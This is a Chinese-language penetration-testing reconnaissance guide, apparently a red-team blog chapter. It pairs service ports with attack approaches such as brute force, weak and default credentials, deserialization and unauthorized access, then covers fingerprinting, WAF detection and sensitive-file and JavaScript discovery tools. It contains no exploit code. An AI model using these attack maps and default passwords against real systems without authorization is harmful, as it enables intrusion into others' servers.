| tcp 1352                          | Lotus                 | 弱口令,信息泄漏,爆破                                         |
| tcp 1433                          | SQL Server            | 注入,提权,sa弱口令,爆破                                      |
| tcp 1521                          | Oracle                | tns爆破,注入,弹shell…                                        |
| tcp 1500                          | ISPmanager            | 弱口令                                                       |
| tcp 1723                          | PPTP                  | 爆破,想办法钓VPN账号,进内网                                  |
| tcp 2082,2083                     | cPanel                | 弱口令                                                       |
| tcp 2181                          | ZooKeeper             | 未授权访问                                                   |
| tcp 2601,2604                     | Zebra                 | 默认密码zerbra                                               |
| tcp 3128                          | Squid                 | 弱口令                                                       |
| tcp 3312,3311                     | kangle                | 弱口令                                                       |
| tcp 3306                          | MySQL                 | 注入,提权,爆破                                               |
| tcp 3389                          | Windows rdp           | shift后门[需要03以下的系统],爆破,ms12-020                    |
| tcp 3690                          | SVN                   | svn泄露,未授权访问                                           |
| tcp 4848                          | GlassFish             | 弱口令                                                       |
| tcp 5000                          | Sybase/DB2            | 爆破,注入                                                    |
| tcp 5432                          | PostgreSQL            | 爆破,注入,弱口令                                             |
| tcp 5900,5901,5902                | VNC                   | 弱口令爆破                                                   |
| tcp 5984                          | CouchDB               | 未授权导致的任意指令执行                                     |
| tcp 6379                          | Redis                 | 可尝试未授权访问,弱口令爆破                                  |
| tcp 7001,7002                     | WebLogic              | Java反序列化,弱口令                                          |
| tcp 7778                          | Kloxo                 | 主机面板登录                                                 |
| tcp 8000                          | Ajenti                | 弱口令                                                       |
| tcp 8009                          | tomcat Ajp            | Tomcat-Ajp协议漏洞                                           |
| tcp 8443                          | Plesk                 | 弱口令                                                       |
| tcp 8069                          | Zabbix                | 远程执行,SQL注入                                             |
| tcp 8080-8089                     | Jenkins,JBoss         | 反序列化,控制台弱口令                                        |
| tcp 9080-9081,9090                | WebSphere             | Java反序列化/弱口令                                          |
| tcp 9200,9300                     | ElasticSearch         | 远程执行                                                     |
| tcp 11211                         | Memcached             | 未授权访问                                                   |
| tcp 27017,27018                   | MongoDB               | 爆破,未授权访问                                              |
| tcp 50070,50030                   | Hadoop                | 默认端口未授权访问                                           |

| **端口号** | **端口说明**                     | **渗透思路**                                                 |
| :--------- | :------------------------------- | :----------------------------------------------------------- |
| 21/69      | FTP/TFTP：文件传输协议           | 爆破、内网嗅探                                               |
| 22         | SSH：远程连接                    | 用户名枚举、爆破                                             |
| 23         | Telnet：远程连接                 | 爆破、内网嗅探                                               |
| 25         | SMTP：邮件服务                   | 邮件伪造                                                     |
| 53         | DNS：域名系统                    | DNS域传送\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙      |
| 389        | LDAP                             | 未授权访问（通过LdapBrowser工具直接连入）                    |
| 443        | https服务                        | OpenSSL 心脏滴血（nmap -sV --script=ssl-heartbleed 目标）    |
| 445        | SMB服务                          | ms17_010远程代码执行                                         |
| 873        | rsync服务                        | 未授权访问                                                   |
| 1090/1099  | Java-rmi                         | JAVA反序列化远程命令执行漏洞                                 |
| 1352       | Lotus Domino邮件服务             | 爆破：弱口令、信息泄漏：源代码                               |
| 1433       | MSSQL                            | 注入、SA弱口令爆破、提权                                     |
| 1521       | Oracle                           | 注入、TNS爆破                                                |
| 2049       | NFS                              | 配置不当                                                     |
| 2181       | ZooKeeper服务                    | 未授权访问                                                   |
| 3306       | MySQL                            | 注入、爆破、写shell、提权                                    |
| 3389       | RDP                              | 爆破、Shift后门、CVE-2019-0708远程代码执行                   |
| 4848       | GlassFish控制台                  | 爆破：控制台弱口令、认证绕过                                 |
| 5000       | Sybase/DB2数据库                 | 爆破、注入                                                   |
| 5432       | PostgreSQL                       | 爆破弱口令、高权限执行系统命令                               |
| 5632       | PcAnywhere服务                   | 爆破弱口令                                                   |
| 5900       | VNC                              | 爆破：弱口令、认证绕过                                       |
| 6379       | Redis                            | 未授权访问、爆破弱口令                                       |
| 7001       | WebLogic中间件                   | 反序列化、控制台弱口令+部署war包、SSRF                       |
| 8000       | jdwp                             | JDWP 远程命令执行漏洞（[工具](https://github.com/IOActive/jdwp-shellifier)） |
| 8080/8089  | Tomcat/JBoss/Resin/Jetty/Jenkins | 反序列化、控制台弱口令、未授权                               |
| 8161       | ActiveMQ                         | admin/admin、任意文件写入、反序列化                          |
| 8069       | Zabbix                           | 远程命令执行                                                 |
| 9043       | WebSphere控制台                  | 控制台弱口令[https://:9043/ibm/console/logon.jsp、远程代码执行](https://blog.gm7.org/个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/07.端口对应渗透（端口渗透备忘录）.html) |
| 9200/9300  | Elasticsearch服务                | 远程代码执行                                                 |
| 11211      | Memcache                         | 未授权访问（nc -vv 目标 11211）                              |
| 27017      | MongoDB                          | 未授权访问、爆破弱口令                                       |
| 50000      | SAP                              | 远程代码执行                                                 |
| 50070      | hadoop                           | 未授权访问                                                   |

------

| **端口号**  | **服务**             | **渗透思路**                                   |
| :---------- | :------------------- | :--------------------------------------------- |
| 21          | FTP/TFTP/VSFTPD      | 爆破/嗅探/溢出/后门                            |
| 22          | ssh远程连接          | 爆破/openssh漏洞                               |
| 23          | Telnet远程连接       | 爆破/嗅探/弱口令                               |
| 25          | SMTP邮件服务         | 邮件伪造                                       |
| 53          | DNS域名解析系统      | 域传送/劫持/缓存投毒/欺骗                      |
| 67/68       | dhcp服务             | 劫持/欺骗                                      |
| 110         | pop3                 | 爆破/嗅探                                      |
| 139         | Samba服务            | 爆破/未授权访问/远程命令执行                   |
| 143         | Imap协议             | 爆破161SNMP协议爆破/搜集目标内网信息           |
| 389         | Ldap目录访问协议     | 注入/未授权访问/弱口令                         |
| 445         | smb                  | ms17-010/端口溢出                              |
| 512/513/514 | Linux Rexec服务      | 爆破/Rlogin登陆                                |
| 873         | Rsync服务            | 文件上传/未授权访问                            |
| 1080        | socket               | 爆破                                           |
| 1352        | Lotus domino邮件服务 | 爆破/信息泄漏                                  |
| 1433        | mssql                | 爆破/注入/SA弱口令                             |
| 1521        | oracle               | 爆破/注入/TNS爆破/反弹shell2049Nfs服务配置不当 |
| 2181        | zookeeper服务        | 未授权访问                                     |
| 2375        | docker remote api    | 未授权访问                                     |
| 3306        | mysql                | 爆破/注入                                      |
| 3389        | Rdp远程桌面链接      | 爆破/shift后门                                 |
| 4848        | GlassFish控制台      | 爆破/认证绕过                                  |
| 5000        | sybase/DB2数据库     | 爆破/注入/提权                                 |
| 5432        | postgresql           | 爆破/注入/缓冲区溢出                           |
| 5632        | pcanywhere服务       | 抓密码/代码执行                                |
| 5900        | vnc                  | 爆破/认证绕过                                  |
| 6379        | Redis数据库          | 未授权访问/爆破                                |
| 7001/7002   | weblogic             | java反序列化/控制台弱口令                      |
| 80/443      | http/https           | web应用漏洞/心脏滴血                           |
| 8069        | zabbix服务           | 远程命令执行/注入                              |
| 8161        | activemq             | 弱口令/写文件                                  |
| 8080/8089   | Jboss/Tomcat/Resin   | 爆破/PUT文件上传/反序列化                      |
| 8083/8086   | influxDB             | 未授权访问                                     |
| 9000        | fastcgi              | 远程命令执行                                   |
| 9090        | Websphere            | 控制台爆破/java反序列化/弱口令                 |
| 9200/9300   | elasticsearch        | 远程代码执行                                   |
| 11211       | memcached            | 未授权访问                                     |
| 27017/27018 | mongodb              | 未授权访问/爆破                                |

| **端口号** | **服务**          | **渗透思路**                                                 |
| :--------- | :---------------- | :----------------------------------------------------------- |
| 20         | ftp_data          | 爆破、嗅探、溢出、后门                                       |
| 21         | ftp_control       | 爆破、嗅探、溢出、后门                                       |
| 23         | telnet            | 爆破、嗅探                                                   |
| 25         | smtp              | 邮件伪造                                                     |
| 53         | DNS               | DNS区域传输、DNS劫持、DNS缓存投毒、DNS欺骗、深度利用：利用DNS隧道技术刺透防火墙 |
| 67         | dhcp              | 劫持、欺骗                                                   |
| 68         | dhcp              | 劫持、欺骗                                                   |
| 110        | pop3              | 爆破                                                         |
| 139        | samba             | 爆破、未授权访问、远程代码执行                               |
| 143        | imap              | 爆破                                                         |
| 161        | snmp              | 爆破                                                         |
| 389        | ldap              | 注入攻击、未授权访问                                         |
| 512        | linux r           | 直接使用rlogin                                               |
| 513        | linux r           | 直接使用rlogin                                               |
| 514        | linux r           | 直接使用rlogin                                               |
| 873        | rsync             | 未授权访问                                                   |
| 888        | BTLINUX           | 宝塔Linux主机管理后台/默认帐户：admin｜默认密码：admin       |
| 999        | PMA               | 护卫神佩带的phpmyadmin管理后台，默认帐户：root｜默认密码：huweishen.com |
| 1080       | socket            | 爆破：进行内网渗透                                           |
| 1352       | lotus             | 爆破：弱口令、信息泄露：源代码                               |
| 1433       | mssql             | 爆破：使用系统用户登录、注入攻击                             |
| 1521       | oracle            | 爆破：TNS、注入攻击                                          |
| 2049       | nfs               | 配置不当                                                     |
| 2181       | zookeeper         | 未授权访问                                                   |
| 3306       | mysql             | 爆破、拒绝服务、注入                                         |
| 3389       | rdp               | 爆破、Shift后门                                              |
| 4848       | glassfish         | 爆破：控制台弱口令、认证绕过                                 |
| 5000       | sybase/DB2        | 爆破、注入                                                   |
| 5432       | postgresql        | 缓冲区溢出、注入攻击、爆破：弱口令                           |
| 5632       | pcanywhere        | 拒绝服务、代码执行                                           |
| 5900       | vnc               | 爆破：弱口令、认证绕过                                       |
| 5901       | vnc               | 爆破：弱口令、认证绕过                                       |
| 5902       | vnc               | 爆破：弱口令、认证绕过                                       |
| 6379       | redis             | 未授权访问、爆破：弱口令                                     |
| 7001       | weblogic          | JAVA反序列化、控制台弱口令、控制台部署webshell               |
| 7002       | weblogic          | JAVA反序列化、控制台弱口令、控制台部署webshell               |
| 80         | web               | 常见Web攻击、控制台爆破、对应服务器版本漏洞                  |
| 443        | web               | 常见Web攻击、控制台爆破、对应服务器版本漏洞                  |
| 8080       | web｜Tomcat｜..   | 常见Web攻击、控制台爆破、对应服务器版本漏洞、Tomcat漏洞      |
| 8069       | zabbix            | 远程命令执行                                                 |
| 9090       | websphere         | 文件泄露、爆破：控制台弱口令、Java反序列                     |
| 9200       | elasticsearch     | 未授权访问、远程代码执行                                     |
| 9300       | elasticsearch     | 未授权访问、远程代码执行                                     |
| 11211      | memcacache        | 未授权访问                                                   |
| 27017      | mongodb           | 爆破、未授权访问                                             |
| 27018      | mongodb           | 爆破、未授权访问                                             |
| 50070      | Hadoop            | 爆破、未授权访问                                             |
| 50075      | Hadoop            | 爆破、未授权访问                                             |
| 14000      | Hadoop            | 爆破、未授权访问                                             |
| 8480       | Hadoop            | 爆破、未授权访问                                             |
| 8088       | web               | 爆破、未授权访问                                             |
| 50030      | Hadoop            | 爆破、未授权访问                                             |
| 50060      | Hadoop            | 爆破、未授权访问                                             |
| 60010      | Hadoop            | 爆破、未授权访问                                             |
| 60030      | Hadoop            | 爆破、未授权访问                                             |
| 10000      | Virtualmin/Webmin | 服务器虚拟主机管理系统                                       |
| 10003      | Hadoop            | 爆破、未授权访问                                             |
| 5984       | couchdb           | 未授权访问                                                   |
| 445        | SMB               | 弱口令爆破，检测是否有ms_08067等溢出                         |
| 1025       | 111               | NFS                                                          |
| 2082       |                   | cpanel主机管理系统登陆 （国外用较多）                        |
| 2083       |                   | cpanel主机管理系统登陆 （国外用较多）                        |
| 2222       |                   | DA虚拟主机管理系统登陆 （国外用较多）                        |
| 2601       |                   | zebra路由                                                    |
| 2604       |                   | zebra路由                                                    |
| 3128       |                   | 代理默认端口,如果没设置口令很可能就直接漫游内网了            |
| 3311       |                   | kangle主机管理系统登陆                                       |
| 3312       |                   | kangle主机管理系统登陆                                       |
| 4440       |                   | 参考WooYun: 借用新浪某服务成功漫游新浪内网                   |
| 6082       |                   | 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 |
| 7778       |                   | 主机控制面板登录                                             |
| 8083       |                   | 主机管理系统 （国外用较多）                                  |
| 8649       |                   |                                                              |
| 8888       |                   | 主机管理系统默认端口                                         |
| 9000       |                   | fcgi php执行                                                 |
| 50000      | SAP               | 命令执行                                                     |

**Web端口：**

```php
80,81,82,443,5000,7001,7010,7100,7547,7777,7801,8000,8001,8002,8003,8005,8009,8010,8011,8060,8069,8070,8080,8081,8082,8083,8085,8086,8087,8088,8089,8090,8091,8161,8443,8880,8888,8970,8989,9000,9001,9002,9043,9090,9200,9300,9443,9898,9900,9998,10002,50000,50070
```

**服务器：**

```php
21,22,445,3389,5900
```

**数据库：**

```php
1433,1521,3306,6379,11211,27017
```

### 06IP定位

这里提供几个不错的溯源定位工具：

https://www.opengps.cn/Default.aspx
https://www.chaipip.com/aiwen.html
https://cz88.net/

## 0x04 指纹信息

通过关键特征，去识别出目标指纹信息可以快速了解目标架构信息，调整攻击方向。

常见指纹信息：

- CMS
  - Discuz、织梦、帝国CMS、WordPress、ecshop、蝉知等
- 前端技术
  - HTML5、jquery、bootstrap、Vue等
- 开发语言
  - PHP、JAVA、Ruby、Python、C#等
- web服务器
  - Apache、Nginx、IIS、lighttpd等
- 应用服务器：
  - Tomcat、Jboss、Weblogic、Websphere等
- 操作系统信息
  - Linux、windows等
- CDN信息
  - 帝联、Cloudflare、网宿、七牛云、阿里云等
- WAF信息
  - 创宇盾、宝塔、安全狗、D盾、玄武盾等。
- 其他组件信息
  - fastjson、shiro、log4j等
  - OA协议办公

### **01CMS**

已知目标CMS后，可以通过已知漏洞匹配利用，如果是开源CMS，就可以进行审计精准发现问题点。

#### 开发语言识别思路

1. 通过爬虫获取动态链接然后进行正则匹配判断

2. header头中X-Powered-By信息

3. Set-Cookie特征信息

   如包含PHPSSIONID说明是php、包含JSESSIONID说明是java、包含ASP.NET_SessionId说明是aspx。

#### 服务器系统识别思路

1. 通过ping命令根据回显中的ttl值来判断是win还是linux，但值可被修改精准度不高。默认Linux是64，win是128
2. 页面回显、报错回显、header头等站点泄露的系统信息。
3. nmap

```bash
nmap -O IP
```

#### CMS识别思路

##### **特定文件的MD5**

一般来说，网站的特定图标、js、css等静态文件不会去修改，通过爬虫对这些文件进行抓取并与规则库中md5值做对比，如果一致就是同一CMS。这种情况不排除会出现二开导致的误报，但速度较快。

##### **页面关键字**

正则匹配关键字或报错信息判断。如Powered by Discuz、dedecms等、tomcat报错页面

##### **请求头信息关键字**

通过匹配http响应包中的banner信息来识别。

如：

- X-Powered-By字段
- Cookies 特征
- Server信息
- WWW-Authenticate
- Meta特征
- ……

##### **url关键字**

将url中存在路由、robots.txt、爬虫结果与规则库做对比分析来判断是否使用了某CMS

如：

- wordpress默认存在目录：wp-includes、wp-admin
- 织梦默认管理后台：dede
- 帝国常用目录：login/loginjs.php
- weblogic常用目录：wls-wsat
- jboss常用目录：jmx-console
- ……

#### 在线平台

- [bugscaner](http://whatweb.bugscaner.com/look/)
- [数字观星](https://fp.shuziguanxing.com/#/)
- [云悉](https://www.yunsee.cn/)（自从需要认证后就没有用过.....还认证失败.....）
- [WhatWeb](https://www.whatweb.net/)

<img src="image/image-20240719162747513.png" alt="image-20240719162747513" style="zoom:80%;" />

#### 工具

- 御剑Web指纹识别
- WhatWeb
- Test404轻量CMS指纹识别
- 椰树
- WTFScan
- [Kscan](https://github.com/lcvvvv/kscan)
- [CMSeeK](https://github.com/Tuhinshubhra/CMSeeK)
- [CMSmap](https://github.com/Dionach/CMSmap)
- [ACMSDiscovery](https://github.com/aedoo/ACMSDiscovery)
- [TideFinger](https://github.com/TideSec/TideFinger)
- [AngelSword](https://github.com/Lucifer1993/AngelSword)
- [EHole(棱洞)2.0](https://github.com/EdgeSecurityTeam/EHole)

> ps: cms识别主要还是在于指纹库的维护和更新。

#### 浏览器插件

[wappalyzer](https://www.wappalyzer.com/)

<img src="image/image-20240719162957798.png" alt="image-20240719162957798" style="zoom:80%;" />

插件开源指纹库：https://github.com/AliasIO/wappalyzer/tree/master/src/technologies

### 02WAF

```
waf是网页程序防火墙一般是软件形式的防火墙非硬件
设备硬件防火墙 火绒软件防火墙 wafweb防火墙
```

遇到WAF就得对症下药，总的来说识别分为两种手工和工具：

#### 手工

一般直接输入敏感字段触发拦截规则库就行，如XSS、SQL payload

<img src="image/image-20240719163155029.png" alt="image-20240719163155029" style="zoom:80%;" />

常见的WAF拦截页面可以参考下某大佬总结的WAF一图流：https://cloud.tencent.com/developer/article/1872310

#### 工具

- https://github.com/EnableSecurity/wafw00f
- https://github.com/Ekultek/WhatWaf
- nmap的`http-waf-fingerprint.nse`脚本

### 03组件

一般通过异常报错、常用路由、常用header头来获取组件版本、配置等相关信息。

常见组件漏洞简记参考博客《组件漏洞简记》章

### 04信息处理

#### Ehole

> https://github.com/EdgeSecurityTeam/EHole
>
> EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic...)。EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。

#### AlliN

> https://github.com/P1-Team/AlliN
>
> 一个辅助平常渗透测试项目或者攻防项目快速打点的综合工具，由之前写的工具AG3改名而来。是一款轻便、小巧、快速、全面的扫描工具。多用于渗透前资产收集和渗透后内网横向渗透。工具从项目上迭代了一些懒人功能（比如提供扫描资产文件中，可以写绝大部分的各种形式的链接/CIDR,并在此基础上可以添加任意端口和路径）

#### Bufferfly

> https://github.com/dr0op/bufferfly
>
> 攻防资产处理小工具，对攻防前的信息搜集到的大批量资产/域名进行存活检测、获取标题头、语料提取、常见web端口检测、简单中间识别，去重等，便于筛选有价值资产。

#### HKTools

> https://github.com/Security-Magic-Weapon/HKTools
>
> 一款辅助安全研发在日常工作中渗透测试、安全研究、安全开发等工作的工具

#### EyeWitness

> https://github.com/FortyNorthSecurity/EyeWitness

Eyewitness可自动查询URL对应网站的截图、RDP服务、Open VNC服务器以及一些服务器title、甚至是可识别的默认凭据等，最终会生成一个详细的html报告。

#### anew(去重)

> https://github.com/tomnomnom/anew
>
> 好用的去重对比工具

### 05敏感信息

### 01目录结构及敏感文件

常见的敏感目录及文件，会对渗透突破有着很大作用，收集思路一般是爬虫采集、递归扫描、Google Hacking。

#### 常见敏感目录及文件

- 备份文件：`www.zip`、`www.rar`、`blog.gm7.org.zip`等
- 代码仓库：`.git`、`.svn`等
- 敏感、隐藏api接口：`/swagger-ui.html`、`/env`等
- 站点配置文件：`crossdomain.xml`、`sitemap.xml`、`security.txt`等
- robots文件
- 网站后台管理页面
- 文件上传/下载界面
- ...

> tips:
>
> - 扫描核心主要在于字典价值
> - 403、404页面可能会存在一些信息，可以多fuzz下。
> - 工具使用时善于关键字过滤，将会减少一些误报。

#### 工具推荐

##### [dirsearch](https://github.com/maurosoria/dirsearch)

dirsearch 是一款使用 python3 编写的，用于暴力破解目录的工具，速度不错，支持随机代理、内容过滤。

##### [feroxbuster](https://github.com/epi052/feroxbuster)

用Rust编写的快速，简单，递归的内容发现工具

##### [yjdirscan](https://github.com/foryujian/yjdirscan)

御剑目录扫描专业版

#### 字典推荐

##### [fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)

庞大的Web Pentesting Fuzz 字典，部分精准度不错，可惜更新是2021的时候了。

##### [Web-Fuzzing-Box](https://github.com/gh0stkey/Web-Fuzzing-Box)

Web Fuzzing Box - Web 模糊测试字典与一些Payloads，主要包含：弱口令暴力破解、目录以及文件枚举、Web漏洞...

字典运用于实战案例：https://gh0st.cn/archives/2019-11-11/1

##### [XXE 暴力枚举字典](https://mp.weixin.qq.com/s/7kUFx6VpCgNVomQ_e6H6HA)

<img src="image/image-20240719163713654.png" alt="image-20240719163713654" style="zoom:80%;" />

#### 02JS信息搜集

js文件一般用于帮助网站执行某些功能，存储着客户端代码，可能会存在大量的敏感信息，通过阅读分析可能会找到宝藏。

##### JS信息查找方法

###### 1. 手工

通过查看页面源代码信息，找到.js后筛选特定信息，但这种方法费时费力，一般网站都会存在大量的js文件，还多数为混淆后的信息。

关键信息查找可以使用浏览器自带的全局搜索：

![image-20240719164250263](image/image-20240719164250263.png)

如：通过path:来查Vue框架路由

<img src="image/image-20240719164309684.png" alt="image-20240719164309684" style="zoom:80%;" />

###### 2. 半自动

通过抓包拦截获取url后使用脚本筛选，比如`Burp Suite`专业版，可以在`Target > sitemap`下，选中目标网站选中`Engagement tools -> Find scripts`，找到网站所有脚本内容。

<img src="image/image-20240719170834350.png" alt="image-20240719170834350" style="zoom:80%;" />

也可以使用`Copy links in selected items`复制出选中脚本项目中所包含的URL链接。

<img src="image/image-20240719170900381.png" alt="image-20240719170900381" style="zoom:80%;" />

粘贴下，然后就可以手工验证url信息价值，有时候可以发现一些未授权、敏感的api接口或者一些GitHub仓库、key值等。

<img src="image/image-20240719171226812.png" alt="image-20240719171226812" style="zoom:80%;" />

这种方法因为结合手工，在一些深层目录架构中，通过`Burp Suite script`可以获取到一些工具跑不到的js信息。

3. 工具：

**[JSFinder](https://github.com/Threezh1/JSFinder)**

> JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具

[JSINFO-SCAN](https://github.com/p1g3/JSINFO-SCAN)

> 递归爬取域名(netloc/domain)，以及递归从JS中获取信息的工具

[URLFinder](https://github.com/pingc0y/URLFinder)

> URLFinder是一款用于快速提取检测页面中JS与URL的工具。
>
> 功能类似于JSFinder，但JSFinder好久没更新了。

[HAE](https://github.com/gh0stkey/HaE)

> **HaE**是基于 `BurpSuite Java插件API` 开发的请求高亮标记与信息提取的辅助型框架式插件，该插件可以通过自定义正则的方式匹配响应报文或请求报文，并对满足正则匹配的报文进行信息高亮与提取。如匹配敏感信息、提取页面中的链接信息等。

[**Repo-supervisor**](https://github.com/auth0/repo-supervisor#)

> Repo-supervisor 是一种工具，可帮助您检测代码中的秘密和密码。
>
> [command-line-mode](https://github.com/auth0/repo-supervisor#command-line-mode) 功能：
>
> CLI 模式允许使用源代码扫描本地目录以检测文件中的机密和密码。结果可能以明文或 JSON 格式返回。
